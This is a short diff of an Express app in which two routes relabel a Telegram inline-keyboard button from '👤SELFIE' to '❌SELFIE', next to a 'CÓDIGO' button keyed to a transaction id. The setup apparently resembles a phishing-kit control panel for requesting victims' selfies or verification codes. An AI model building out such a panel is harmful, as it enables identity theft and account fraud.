@@ -76,7 +76,7 @@ app.post('/enviar', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
+        { text: "❌SELFIE", callback_data: `laderrorselfi:${txid}` },
         { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
@@ -121,7 +121,7 @@ app.post('/enviar2', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
+        { text: "❌SELFIE", callback_data: `laderrorselfi:${txid}` },
         { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
       ],
       [
